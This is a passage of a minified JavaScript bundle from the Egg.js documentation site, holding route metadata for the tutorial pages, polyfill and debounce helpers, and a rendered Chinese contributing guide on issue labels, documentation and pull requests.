Topics",heading:"create-topics"},{depth:3,value:"Update Topics",heading:"update-topics"},{depth:3,value:"Error Handling",heading:"error-handling"},{depth:2,value:"Getting Started",heading:"getting-started"},{depth:3,value:"Application Initialization",heading:"application-initialization"},{depth:3,value:"Enable validate plugin",heading:"enable-validate-plugin"},{depth:3,value:"Router Registry",heading:"router-registry"},{depth:3,value:"Developing Controller",heading:"developing-controller"},{depth:3,value:"Developing Service",heading:"developing-service"},{depth:3,value:"Unified Error Handling",heading:"unified-error-handling"},{depth:2,value:"Testing",heading:"testing"},{depth:3,value:"Controller Testing",heading:"controller-testing"},{depth:3,value:"Service Testing",heading:"service-testing"}],nav:{path:"/tutorials",title:"Tutorials"}},title:"Build RESTful API - Egg"},{path:"/zh-CN/tutorials/restful",component:n("2FGb").default,exact:!0,meta:{filePath:"site/docs/tutorials/restful.zh-CN.md",updatedTime:1687656833e3,title:"\u5b9e\u73b0 RESTful API",slugs:[{depth:2,value:"\u8bbe\u8ba1\u54cd\u5e94\u683c\u5f0f",heading:"\u8bbe\u8ba1\u54cd\u5e94\u683c\u5f0f"},{depth:3,value:"\u83b7\u53d6\u4e3b\u9898\u5217\u8868",heading:"\u83b7\u53d6\u4e3b\u9898\u5217\u8868"},{depth:3,value:"\u83b7\u53d6\u5355\u4e2a\u4e3b\u9898",heading:"\u83b7\u53d6\u5355\u4e2a\u4e3b\u9898"},{depth:3,value:"\u521b\u5efa\u4e3b\u9898",heading:"\u521b\u5efa\u4e3b\u9898"},{depth:3,value:"\u66f4\u65b0\u4e3b\u9898",heading:"\u66f4\u65b0\u4e3b\u9898"},{depth:3,value:"\u9519\u8bef\u5904\u7406",heading:"\u9519\u8bef\u5904\u7406"},{depth:2,value:"\u5b9e\u73b0",heading:"\u5b9e\u73b0"},{depth:3,value:"\u521d\u59cb\u5316\u9879\u76ee",heading:"\u521d\u59cb\u5316\u9879\u76ee"},{depth:3,value:"\u5f00\u542f validate \u63d2\u4ef6",heading:"\u5f00\u542f-validate-\u63d2\u4ef6"},{depth:3,value:"\u6ce8\u518c\u8def\u7531",heading:"\u6ce8\u518c\u8def\u7531"},{depth:3,value:"controller \u5f00\u53d1",heading:"controller-\u5f00\u53d1"},{depth:3,value:"service \u5f00\u53d1",heading:"service-\u5f00\u53d1"},{depth:3,value:"\u7edf\u4e00\u9519\u8bef\u5904\u7406",heading:"\u7edf\u4e00\u9519\u8bef\u5904\u7406"},{depth:2,value:"\u6d4b\u8bd5",heading:"\u6d4b\u8bd5"},{depth:3,value:"Controller \u6d4b\u8bd5",heading:"controller-\u6d4b\u8bd5"},{depth:3,value:"Service \u6d4b\u8bd5",heading:"service-\u6d4b\u8bd5"}],locale:"zh-CN",nav:{path:"/zh-CN/tutorials",title:"\u6559\u7a0b"}},title:"\u5b9e\u73b0 RESTful API - Egg"},{path:"/tutorials/sequelize",component:n("OTtR").default,exact:!0,meta:{filePath:"site/docs/tutorials/sequelize.md",updatedTime:1687656833e3,title:"Sequelize",slugs:[{depth:2,value:"Preparing",heading:"preparing"},{depth:2,value:"Initialization",heading:"initialization"},{depth:2,value:"Database and Migrations Initialization",heading:"database-and-migrations-initialization"},{depth:2,value:"Coding",heading:"coding"},{depth:2,value:"Unit Test",heading:"unit-test"},{depth:2,value:"Full Example",heading:"full-example"},{depth:2,value:"Boilerplate",heading:"boilerplate"}],nav:{path:"/tutorials",title:"Tutorials"}},title:"Sequelize - Egg"},{path:"/zh-CN/tutorials/sequelize",component:n("aXUZ").default,exact:!0,meta:{filePath:"site/docs/tutorials/sequelize.zh-CN.md",updatedTime:1687656833e3,title:"Sequelize",slugs:[{depth:2,value:"\u51c6\u5907\u5de5\u4f5c",heading:"\u51c6\u5907\u5de5\u4f5c"},{depth:2,value:"\u521d\u59cb\u5316\u9879\u76ee",heading:"\u521d\u59cb\u5316\u9879\u76ee"},{depth:2,value:"\u521d\u59cb\u5316\u6570\u636e\u5e93\u548c Migrations",heading:"\u521d\u59cb\u5316\u6570\u636e\u5e93\u548c-migrations"},{depth:2,value:"\u7f16\u5199\u4ee3\u7801",heading:"\u7f16\u5199\u4ee3\u7801"},{depth:2,value:"\u5355\u5143\u6d4b\u8bd5",heading:"\u5355\u5143\u6d4b\u8bd5"},{depth:2,value:"\u5b8c\u6574\u793a\u4f8b",heading:"\u5b8c\u6574\u793a\u4f8b"},{depth:2,value:"\u811a\u624b\u67b6",heading:"\u811a\u624b\u67b6"}],locale:"zh-CN",nav:{path:"/zh-CN/tutorials",title:"\u6559\u7a0b"}},title:"Sequelize - Egg"},{path:"/tutorials/socketio",component:n("/xmG").default,exact:!0,meta:{filePath:"site/docs/tutorials/socketio.md",updatedTime:1687656833e3,title:"Socket.IO",slugs:[{depth:2,value:"install egg-socket.io",heading:"install-egg-socketio"},{depth:3,value:"Installation",heading:"installation"},{depth:3,value:"Configuration",heading:"configuration"},{depth:4,value:"uws",heading:"uws"},{depth:4,value:"redis",heading:"redis"},{depth:3,value:"Deployment",heading:"deployment"},{depth:2,value:"Using egg-socket.io",heading:"using-egg-socketio"},{depth:3,value:"Middleware",heading:"middleware"},{depth:4,value:"Connection",heading:"connection"},{depth:4,value:"Packet",heading:"packet"},{depth:3,value:"Controller",heading:"controller"},{depth:3,value:"Router",heading:"router"},{depth:3,value:"Namespace/Room",heading:"namespaceroom"},{depth:4,value:"Namespace (nsp)",heading:"namespace-nsp"},{depth:4,value:"Room",heading:"room"},{depth:2,value:"Examples",heading:"examples"},{depth:3,value:"Client",heading:"client"},{depth:4,value:"WeChat Applets",heading:"wechat-applets"},{depth:3,value:"Server",heading:"server"},{depth:4,value:"Config",heading:"config"},{depth:4,value:"Helper",heading:"helper"},{depth:4,value:"Middleware",heading:"middleware-1"},{depth:4,value:"Controller",heading:"controller-1"},{depth:4,value:"Router",heading:"router-1"},{depth:2,value:"Reference Links",heading:"reference-links"}],nav:{path:"/tutorials",title:"Tutorials"}},title:"Socket.IO - Egg"},{path:"/zh-CN/tutorials/socketio",component:n("fRg2").default,exact:!0,meta:{filePath:"site/docs/tutorials/socketio.zh-CN.md",updatedTime:1687656833e3,title:"Socket.IO",slugs:[{depth:2,value:"\u5b89\u88c5 egg-socket.io",heading:"\u5b89\u88c5-egg-socketio"},{depth:3,value:"\u5b89\u88c5",heading:"\u5b89\u88c5"},{depth:3,value:"\u914d\u7f6e",heading:"\u914d\u7f6e"},{depth:4,value:"uws",heading:"uws"},{depth:4,value:"redis",heading:"redis"},{depth:3,value:"\u90e8\u7f72",heading:"\u90e8\u7f72"},{depth:2,value:"\u4f7f\u7528 egg-socket.io",heading:"\u4f7f\u7528-egg-socketio"},{depth:3,value:"Middleware",heading:"middleware"},{depth:4,value:"Connection",heading:"connection"},{depth:4,value:"Packet",heading:"packet"},{depth:3,value:"Controller",heading:"controller"},{depth:3,value:"Router",heading:"router"},{depth:3,value:"Namespace/Room",heading:"namespaceroom"},{depth:4,value:"Namespace (nsp)",heading:"namespace-nsp"},{depth:4,value:"Room",heading:"room"},{depth:2,value:"\u5b9e\u4f8b",heading:"\u5b9e\u4f8b"},{depth:3,value:"client",heading:"client"},{depth:4,value:"\u5fae\u4fe1\u5c0f\u7a0b\u5e8f",heading:"\u5fae\u4fe1\u5c0f\u7a0b\u5e8f"},{depth:3,value:"server",heading:"server"},{depth:4,value:"config",heading:"config"},{depth:4,value:"helper",heading:"helper"},{depth:4,value:"middleware",heading:"middleware-1"},{depth:4,value:"controller",heading:"controller-1"},{depth:4,value:"router",heading:"router-1"},{depth:2,value:"\u53c2\u8003\u94fe\u63a5",heading:"\u53c2\u8003\u94fe\u63a5"}],locale:"zh-CN",nav:{path:"/zh-CN/tutorials",title:"\u6559\u7a0b"}},title:"Socket.IO - Egg"},{path:"/tutorials/typescript",component:n("oonY").default,exact:!0,meta:{filePath:"site/docs/tutorials/typescript.md",updatedTime:1687656833e3,title:"TypeScript",slugs:[{depth:2,value:"Quick Start",heading:"quick-start"},{depth:2,value:"Principles of Catalogs",heading:"principles-of-catalogs"},{depth:3,value:"Controller",heading:"controller"},{depth:3,value:"Router",heading:"router"},{depth:3,value:"Service",heading:"service"},{depth:3,value:"Middleware",heading:"middleware"},{depth:3,value:"Extend",heading:"extend"},{depth:3,value:"Config",heading:"config"},{depth:3,value:"Plugin",heading:"plugin"},{depth:3,value:"Lifecycle",heading:"lifecycle"},{depth:3,value:"Typings",heading:"typings"},{depth:2,value:"Developing period",heading:"developing-period"},{depth:3,value:"ts-node",heading:"ts-node"},{depth:3,value:"egg-ts-helper",heading:"egg-ts-helper"},{depth:3,value:"Unit Test and Cov",heading:"unit-test-and-cov"},{depth:3,value:"Debug",heading:"debug"},{depth:2,value:"Deployment",heading:"deployment"},{depth:3,value:"Building",heading:"building"},{depth:3,value:"Error Stacks",heading:"error-stacks"},{depth:2,value:"Guides to the Developments of Plugin/Framework",heading:"guides-to-the-developments-of-pluginframework"},{depth:3,value:"Plugin",heading:"plugin-1"},{depth:3,value:"The Outer Framework",heading:"the-outer-framework"},{depth:2,value:"Frequently-asked questions",heading:"frequently-asked-questions"},{depth:3,value:"ts won't be loaded when running npm start",heading:"ts-wont-be-loaded-when-running-npm-start"},{depth:3,value:"There's no loaded objects when using egg's plugin",heading:"theres-no-loaded-objects-when-using-eggs-plugin"},{depth:3,value:"paths is invalid in tsconfig.json",heading:"paths-is-invalid-in-tsconfigjson"},{depth:3,value:"How to write unit tests for declarations of egg's plugins?",heading:"how-to-write-unit-tests-for-declarations-of-eggs-plugins"},{depth:3,value:"Slow Compilation?",heading:"slow-compilation"},{depth:4,value:"Close typecheck",heading:"close-typecheck"},{depth:4,value:"Switch for a high efficient compiler",heading:"switch-for-a-high-efficient-compiler"},{depth:4,value:"Use tsc",heading:"use-tsc"}],nav:{path:"/tutorials",title:"Tutorials"}},title:"TypeScript - Egg"},{path:"/zh-CN/tutorials/typescript",component:n("nkd+").default,exact:!0,meta:{filePath:"site/docs/tutorials/typescript.zh-CN.md",updatedTime:1687656833e3,title:"TypeScript",slugs:[{depth:2,value:"\u5feb\u901f\u5165\u95e8",heading:"\u5feb\u901f\u5165\u95e8"},{depth:2,value:"\u76ee\u5f55\u89c4\u8303",heading:"\u76ee\u5f55\u89c4\u8303"},{depth:3,value:"\u63a7\u5236\u5668\uff08Controller\uff09",heading:"\u63a7\u5236\u5668controller"},{depth:3,value:"\u8def\u7531\uff08Router\uff09",heading:"\u8def\u7531router"},{depth:3,value:"\u670d\u52a1\uff08Service\uff09",heading:"\u670d\u52a1service"},{depth:3,value:"\u4e2d\u95f4\u4ef6\uff08Middleware\uff09",heading:"\u4e2d\u95f4\u4ef6middleware"},{depth:3,value:"\u6269\u5c55\uff08Extend\uff09",heading:"\u6269\u5c55extend"},{depth:3,value:"\u914d\u7f6e\uff08Config\uff09",heading:"\u914d\u7f6econfig"},{depth:3,value:"\u63d2\u4ef6\uff08Plugin\uff09",heading:"\u63d2\u4ef6plugin"},{depth:3,value:"\u751f\u547d\u5468\u671f\uff08Lifecycle\uff09",heading:"\u751f\u547d\u5468\u671flifecycle"},{depth:3,value:"TS \u7c7b\u578b\u5b9a\u4e49\uff08Typings\uff09",heading:"ts-\u7c7b\u578b\u5b9a\u4e49typings"},{depth:2,value:"\u5f00\u53d1\u671f",heading:"\u5f00\u53d1\u671f"},{depth:3,value:"ts-node",heading:"ts-node"},{depth:3,value:"egg-ts-helper",heading:"egg-ts-helper"},{depth:3,value:"\u5355\u5143\u6d4b\u8bd5\u548c\u8986\u76d6\u7387\uff08Unit Test and Cov\uff09",heading:"\u5355\u5143\u6d4b\u8bd5\u548c\u8986\u76d6\u7387unit-test-and-cov"},{depth:3,value:"\u8c03\u8bd5\uff08Debug\uff09",heading:"\u8c03\u8bd5debug"},{depth:2,value:"\u90e8\u7f72\uff08Deploy\uff09",heading:"\u90e8\u7f72deploy"},{depth:3,value:"\u6784\u5efa\uff08Build\uff09",heading:"\u6784\u5efabuild"},{depth:3,value:"\u9519\u8bef\u5806\u6808\uff08Error Stack\uff09",heading:"\u9519\u8bef\u5806\u6808error-stack"},{depth:2,value:"\u63d2\u4ef6 / \u6846\u67b6\u5f00\u53d1\u6307\u5357",heading:"\u63d2\u4ef6--\u6846\u67b6\u5f00\u53d1\u6307\u5357"},{depth:3,value:"\u63d2\u4ef6",heading:"\u63d2\u4ef6"},{depth:3,value:"\u4e0a\u5c42\u6846\u67b6",heading:"\u4e0a\u5c42\u6846\u67b6"},{depth:2,value:"\u5e38\u89c1\u95ee\u9898",heading:"\u5e38\u89c1\u95ee\u9898"},{depth:3,value:"\u8fd0\u884c npm start \u4e0d\u4f1a\u52a0\u8f7d ts",heading:"\u8fd0\u884c-npm-start-\u4e0d\u4f1a\u52a0\u8f7d-ts"},{depth:3,value:"\u4f7f\u7528\u4e86 egg \u63d2\u4ef6\u540e\u53d1\u73b0\u6ca1\u6709\u5bf9\u5e94\u63d2\u4ef6\u6302\u8f7d\u7684\u5bf9\u8c61",heading:"\u4f7f\u7528\u4e86-egg-\u63d2\u4ef6\u540e\u53d1\u73b0\u6ca1\u6709\u5bf9\u5e94\u63d2\u4ef6\u6302\u8f7d\u7684\u5bf9\u8c61"},{depth:3,value:"\u5728 tsconfig.json \u4e2d\u914d\u7f6e\u4e86 paths \u65e0\u6548",heading:"\u5728-tsconfigjson-\u4e2d\u914d\u7f6e\u4e86-paths-\u65e0\u6548"},{depth:3,value:"\u7ed9 egg \u63d2\u4ef6\u63d0\u4ea4\u58f0\u660e\u7684\u65f6\u5019\u5982\u4f55\u7f16\u5199\u5355\u6d4b\uff1f",heading:"\u7ed9-egg-\u63d2\u4ef6\u63d0\u4ea4\u58f0\u660e\u7684\u65f6\u5019\u5982\u4f55\u7f16\u5199\u5355\u6d4b"},{depth:3,value:"\u7f16\u8bd1\u901f\u5ea6\u6162\uff1f",heading:"\u7f16\u8bd1\u901f\u5ea6\u6162"},{depth:4,value:"\u5173\u95ed\u7c7b\u578b\u68c0\u67e5",heading:"\u5173\u95ed\u7c7b\u578b\u68c0\u67e5"},{depth:4,value:"\u66f4\u6362\u9ad8\u6027\u80fd compiler",heading:"\u66f4\u6362\u9ad8\u6027\u80fd-compiler"},{depth:4,value:"\u4f7f\u7528 tsc",heading:"\u4f7f\u7528-tsc"}],locale:"zh-CN",nav:{path:"/zh-CN/tutorials",title:"\u6559\u7a0b"}},title:"TypeScript - Egg"}],title:"Egg",component:e=>e.children}];return o["a"].applyPlugins({key:"patchRoutes",type:d["ApplyPluginsType"].event,args:{routes:e}}),e}n("HMVt");var L=function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};return o["a"].applyPlugins({key:"render",type:d["ApplyPluginsType"].compose,initialValue:()=>{var t=o["a"].applyPlugins({key:"modifyClientRenderOpts",type:d["ApplyPluginsType"].modify,initialValue:{routes:e.routes||A(),plugin:o["a"],history:Object(S["a"])(e.hot),isServer:Object({NODE_ENV:"production"}).__IS_SERVER,rootElement:"root",defaultTitle:"Egg"}});return Object(C["renderClient"])(t)},args:e})},T=L();t["default"]=T();window.g_umi={version:"3.5.41"}},TwHz:function(e,t,n){var a=n("9Rcy"),r=n("Xdqv"),l=n("U16M");e.exports=!a&&!r((function(){return 7!=Object.defineProperty(l("div"),"a",{get:function(){return 7}}).a}))},Tx0u:function(e,t,n){var a=n("V3tB");e.exports=a("document","documentElement")},TzLU:function(e,t,n){var a=n("A0UU"),r=n("1xGk"),l="__core-js_shared__",o=a[l]||r(l,{});e.exports=o},U16M:function(e,t,n){var a=n("A0UU"),r=n("a7jj"),l=a.document,o=r(l)&&r(l.createElement);e.exports=function(e){return o?l.createElement(e):{}}},U9Bc:function(e,t,n){var a=n("09W1"),r=n("HMha"),l=n("Cs1J"),o="Expected a function",i=Math.max,c=Math.min;function s(e,t,n){var s,u,d,m,p,h,g=0,f=!1,E=!1,b=!0;if("function"!=typeof e)throw new TypeError(o);function v(t){var n=s,a=u;return s=u=void 0,g=t,m=e.apply(a,n),m}function y(e){return g=e,p=setTimeout(x,t),f?v(e):m}function k(e){var n=e-h,a=e-g,r=t-n;return E?c(r,d-a):r}function w(e){var n=e-h,a=e-g;return void 0===h||n>=t||n<0||E&&a>=d}function x(){var e=r();if(w(e))return j(e);p=setTimeout(x,k(e))}function j(e){return p=void 0,b&&s?v(e):(s=u=void 0,m)}function S(){void 0!==p&&clearTimeout(p),g=0,s=h=u=p=void 0}function C(){return void 0===p?m:j(r())}function A(){var e=r(),n=w(e);if(s=arguments,u=this,h=e,n){if(void 0===p)return y(h);if(E)return clearTimeout(p),p=setTimeout(x,t),v(h)}return void 0===p&&(p=setTimeout(x,t)),m}return t=l(t)||0,a(n)&&(f=!!n.leading,E="maxWait"in n,d=E?i(l(n.maxWait)||0,t):d,b="trailing"in n?!!n.trailing:b),A.cancel=S,A.flush=C,A}e.exports=s},UEoX:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u6709\u4efb\u4f55\u7591\u95ee\uff0c\u6b22\u8fce\u63d0\u4ea4 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/issues"},"issue"),"\uff0c \u6216\u8005\u76f4\u63a5\u4fee\u6539\u63d0\u4ea4 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/pulls"},"PR"),"!"),r.a.createElement("h2",{id:"\u63d0\u4ea4-issue"},r.a.createElement(l["AnchorLink"],{to:"#\u63d0\u4ea4-issue","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d0\u4ea4 issue"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u8bf7\u786e\u5b9a issue \u7684\u7c7b\u578b\u3002"),r.a.createElement("li",null,"\u8bf7\u907f\u514d\u63d0\u4ea4\u91cd\u590d\u7684 issue\uff0c\u5728\u63d0\u4ea4\u4e4b\u524d\u641c\u7d22\u73b0\u6709\u7684 issue\u3002"),r.a.createElement("li",null,"\u5728\u6807\u7b7e(\u5206\u7c7b\u53c2\u8003",r.a.createElement("strong",null,"\u6807\u7b7e\u5206\u7c7b"),"), \u6807\u9898 \u6216\u8005\u5185\u5bb9\u4e2d\u4f53\u73b0\u660e\u786e\u7684\u610f\u56fe\u3002")),r.a.createElement("p",null,"\u968f\u540e egg \u8d1f\u8d23\u4eba\u4f1a\u786e\u8ba4 issue \u610f\u56fe\uff0c\u66f4\u65b0\u5408\u9002\u7684\u6807\u7b7e\uff0c\u5173\u8054 milestone\uff0c\u6307\u6d3e\u5f00\u53d1\u8005\u3002"),r.a.createElement("p",null,"\u6807\u7b7e\u53ef\u5206\u4e3a\u4e24\u7c7b\uff0ctype \u548c scope"),r.a.createElement("ul",null,r.a.createElement("li",null,"type: issue \u7684\u7c7b\u578b\uff0c\u5982 ",r.a.createElement("code",null,"feature"),", ",r.a.createElement("code",null,"bug"),", ",r.a.createElement("code",null,"documentation"),", ",r.a.createElement("code",null,"performance"),", ",r.a.createElement("code",null,"support")," ..."),r.a.createElement("li",null,"scope: \u4fee\u6539\u6587\u4ef6\u7684\u8303\u56f4\uff0c\u5982 ",r.a.createElement("code",null,"core: xx"),"\uff0c",r.a.createElement("code",null,"plugin: xx"),"\uff0c",r.a.createElement("code",null,"deps: xx"))),r.a.createElement("h3",{id:"\u5e38\u7528\u6807\u7b7e\u8bf4\u660e"},r.a.createElement(l["AnchorLink"],{to:"#\u5e38\u7528\u6807\u7b7e\u8bf4\u660e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5e38\u7528\u6807\u7b7e\u8bf4\u660e"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"support"),": issue \u63d0\u51fa\u7684\u95ee\u9898\u9700\u8981\u5f00\u53d1\u8005\u534f\u4f5c\u6392\u67e5\uff0c\u54a8\u8be2\uff0c\u8c03\u8bd5\u7b49\u7b49\u65e5\u5e38\u6280\u672f\u652f\u6301\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"bug"),": \u4e00\u65e6\u53d1\u73b0\u53ef\u80fd\u662f bug \u7684\u95ee\u9898\uff0c\u8bf7\u6253\u4e0a ",r.a.createElement("code",null,"bug"),"\uff0c\u7136\u540e\u7b49\u5f85\u786e\u8ba4\uff0c\u4e00\u65e6\u786e\u8ba4\u662f bug\uff0c\u6b64 issue \u4f1a\u88ab\u518d\u6253\u4e0a ",r.a.createElement("code",null,"confirmed"),"\u3002",r.a.createElement("ul",null,r.a.createElement("li",null,"\u6b64\u65f6 issue \u4f1a\u88ab\u975e\u5e38\u9ad8\u7684\u4f18\u5148\u7ea7\u8fdb\u884c\u5904\u7406\u3002"),r.a.createElement("li",null,"\u5982\u679c\u6b64 bug \u662f\u6b63\u5728\u5f71\u54cd\u7ebf\u4e0a\u5e94\u7528\u6b63\u5e38\u8fd0\u884c\uff0c\u4f1a\u518d\u6253\u4e0a ",r.a.createElement("code",null,"critical"),"\uff0c\u4ee3\u8868\u662f\u6700\u9ad8\u4f18\u5148\u7ea7\uff0c\u9700\u8981\u9a6c\u4e0a\u7acb\u523b\u5904\u7406\uff01"),r.a.createElement("li",null,"bug \u4f1a\u5728\u6700\u4f4e\u9700\u8981\u4fee\u590d\u7684\u7248\u672c\u8fdb\u884c\u4fee\u590d\uff0c\u5982\u662f\u5728 ",r.a.createElement("code",null,"0.9.x")," \u8981\u4fee\u590d\u7684\uff0c\u800c\u5f53\u524d\u6700\u65b0\u7248\u672c\u662f ",r.a.createElement("code",null,"1.1.x"),"\uff0c \u90a3\u4e48\u6b64 issue \u8fd8\u4f1a\u88ab\u6253\u4e0a ",r.a.createElement("code",null,"0.9"),"\uff0c",r.a.createElement("code",null,"0.10"),"\uff0c",r.a.createElement("code",null,"1.0"),"\uff0c",r.a.createElement("code",null,"1.1"),"\uff0c\u4ee3\u8868\u9700\u8981\u4fee\u590d\u5230\u8fd9\u4e9b\u7248\u672c\u3002"))),r.a.createElement("li",null,r.a.createElement("code",null,"core: xx"),": \u4ee3\u8868 issue \u8ddf core \u5185\u6838\u76f8\u5173\uff0c\u5982 ",r.a.createElement("code",null,"core: antx")," \u4ee3\u8868\u8ddf ",r.a.createElement("code",null,"antx")," \u914d\u7f6e\u76f8\u5173\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"plugin: xx"),": \u4ee3\u8868 issue \u8ddf\u63d2\u4ef6\u76f8\u5173\uff0c\u5982 ",r.a.createElement("code",null,"deps: session")," \u4ee3\u8868\u8ddf ",r.a.createElement("code",null,"session")," \u63d2\u4ef6\u76f8\u5173\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"deps: xx"),": \u4ee3\u8868 issue \u8ddf ",r.a.createElement("code",null,"dependencies")," \u6a21\u5757\u76f8\u5173\uff0c\u5982 ",r.a.createElement("code",null,"deps: egg-cors")," \u4ee3\u8868\u8ddf ",r.a.createElement("code",null,"egg-cors")," \u6a21\u5757\u76f8\u5173\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"chore: documentation"),": \u4ee3\u8868\u53d1\u73b0\u4e86\u6587\u6863\u76f8\u5173\u95ee\u9898\uff0c\u9700\u8981\u4fee\u590d\u6587\u6863\u8bf4\u660e\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"cbd"),": \u4ee3\u8868\u8ddf\u670d\u52a1\u5668\u90e8\u7f72\u76f8\u5173")),r.a.createElement("h2",{id:"\u7f16\u5199\u6587\u6863"},r.a.createElement(l["AnchorLink"],{to:"#\u7f16\u5199\u6587\u6863","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7f16\u5199\u6587\u6863"),r.a.createElement("p",null,"\u6240\u6709\u529f\u80fd\u70b9\u5fc5\u987b\u63d0\u4ea4\u914d\u5957\u6587\u6863\uff0c\u6587\u6863\u987b\u6ee1\u8db3\u4ee5\u4e0b\u8981\u6c42"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5fc5\u987b\u8bf4\u6e05\u695a\u95ee\u9898\u7684\u51e0\u4e2a\u65b9\u9762\uff1awhat\uff08\u662f\u4ec0\u4e48\uff09\uff0cwhy\uff08\u4e3a\u4ec0\u4e48\uff09\uff0chow\uff08\u600e\u4e48\u505a\uff09\uff0c\u53ef\u6839\u636e\u95ee\u9898\u7684\u7279\u6027\u6709\u6240\u4fa7\u91cd\u3002"),r.a.createElement("li",null,"how \u90e8\u5206\u5fc5\u987b\u5305\u542b\u8be6\u5c3d\u5b8c\u6574\u7684\u64cd\u4f5c\u6b65\u9aa4\uff0c\u5fc5\u8981\u65f6\u9644\u4e0a ",r.a.createElement("strong",null,"\u8db3\u591f\u7b80\u5355\uff0c\u53ef\u8fd0\u884c")," \u7684\u8303\u4f8b\u4ee3\u7801\uff0c \u6240\u6709\u8303\u4f8b\u4ee3\u7801\u653e\u5728 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples"},"eggjs/examples")," \u5e93\u4e2d\u3002"),r.a.createElement("li",null,"\u63d0\u4f9b\u5fc5\u8981\u7684\u94fe\u63a5\uff0c\u5982\u7533\u8bf7\u6d41\u7a0b\uff0c\u672f\u8bed\u89e3\u91ca\u548c\u53c2\u8003\u6587\u6863\u7b49\u3002"),r.a.createElement("li",null,"\u540c\u6b65\u4fee\u6539\u4e2d\u82f1\u6587\u6587\u6863\uff0c\u6216\u8005\u5728 PR \u91cc\u9762\u8bf4\u660e\u3002")),r.a.createElement("h2",{id:"\u63d0\u4ea4\u4ee3\u7801"},r.a.createElement(l["AnchorLink"],{to:"#\u63d0\u4ea4\u4ee3\u7801","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d0\u4ea4\u4ee3\u7801"),r.a.createElement("h3",{id:"\u63d0\u4ea4-pull-request"},r.a.createElement(l["AnchorLink"],{to:"#\u63d0\u4ea4-pull-request","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d0\u4ea4 Pull Request"),r.a.createElement("p",null,"\u5982\u679c\u4f60\u6709\u4ed3\u5e93\u7684\u5f00\u53d1\u8005\u6743\u9650\uff0c\u800c\u4e14\u5e0c\u671b\u8d21\u732e\u4ee3\u7801\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u521b\u5efa\u5206\u652f\u4fee\u6539\u4ee3\u7801\u63d0\u4ea4 PR\uff0cegg \u5f00\u53d1\u56e2\u961f\u4f1a review \u4ee3\u7801\u5408\u5e76\u5230\u4e3b\u5e72\u3002"),r.a.createElement(o["a"],{code:'# \u5148\u521b\u5efa\u5f00\u53d1\u5206\u652f\u5f00\u53d1\uff0c\u5206\u652f\u540d\u5e94\u8be5\u6709\u542b\u4e49\uff0c\u907f\u514d\u4f7f\u7528 update\u3001tmp \u4e4b\u7c7b\u7684\n$ git checkout -b branch-name\n\n# \u5f00\u53d1\u5b8c\u6210\u540e\u8dd1\u4e0b\u6d4b\u8bd5\u662f\u5426\u901a\u8fc7\uff0c\u5fc5\u8981\u65f6\u9700\u8981\u65b0\u589e\u6216\u4fee\u6539\u6d4b\u8bd5\u7528\u4f8b\n$ npm test\n\n# \u6d4b\u8bd5\u901a\u8fc7\u540e\uff0c\u63d0\u4ea4\u4ee3\u7801\uff0cmessage \u89c1\u4e0b\u9762\u7684\u89c4\u8303\n\n$ git add . # git add -u \u5220\u9664\u6587\u4ef6\n$ git commit -m "fix(role): role.use must xxx"\n$ git push origin branch-name',lang:"bash"}),r.a.createElement("p",null,"\u7531\u4e8e\u8c01\u4e5f\u65e0\u6cd5\u4fdd\u8bc1\u8fc7\u4e86\u591a\u4e45\u4e4b\u540e\u8fd8\u8bb0\u5f97\u591a\u5c11\uff0c\u4e3a\u4e86\u540e\u671f\u56de\u6eaf\u5386\u53f2\u7684\u65b9\u4fbf\uff0c\u8bf7\u5728\u63d0\u4ea4 MR \u65f6\u786e\u4fdd\u63d0\u4f9b\u4e86\u4ee5\u4e0b\u4fe1\u606f\u3002"),r.a.createElement("ol",null,r.a.createElement("li",null,"\u9700\u6c42\u70b9\uff08\u4e00\u822c\u5173\u8054 issue \u6216\u8005\u6ce8\u91ca\u90fd\u7b97\uff09"),r.a.createElement("li",null,"\u5347\u7ea7\u539f\u56e0\uff08\u4e0d\u540c\u4e8e issue\uff0c\u53ef\u4ee5\u7b80\u8981\u63cf\u8ff0\u4e0b\u4e3a\u4ec0\u4e48\u8981\u5904\u7406\uff09"),r.a.createElement("li",null,"\u6846\u67b6\u6d4b\u8bd5\u70b9\uff08\u53ef\u4ee5\u5173\u8054\u5230\u6d4b\u8bd5\u6587\u4ef6\uff0c\u4e0d\u7528\u8be6\u7ec6\u63cf\u8ff0\uff0c\u5173\u952e\u70b9\u5373\u53ef\uff09"),r.a.createElement("li",null,"\u5173\u6ce8\u70b9\uff08\u9488\u5bf9\u7528\u6237\u800c\u8a00\uff0c\u53ef\u4ee5\u6ca1\u6709\uff0c\u4e00\u822c\u662f\u4e0d\u517c\u5bb9\u66f4\u65b0\u7b49\uff0c\u9700\u8981\u989d\u5916\u63d0\u793a\uff09")),r.a.createElement("h3",{id:"\u4ee3\u7801\u98ce\u683c"},r.a.createElement(l["AnchorLink"],{to:"#\u4ee3\u7801\u98ce\u683c","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4ee3\u7801\u98ce\u683c"),r.a.createElement("p",null,"\u4f60\u7684\u4ee3\u7801\u98ce\u683c\u5fc5\u987b\u901a\u8fc7 eslint\uff0c\u4f60\u53ef\u4ee5\u8fd0\u884c ",r.a.createElement("code",null,"$ npm 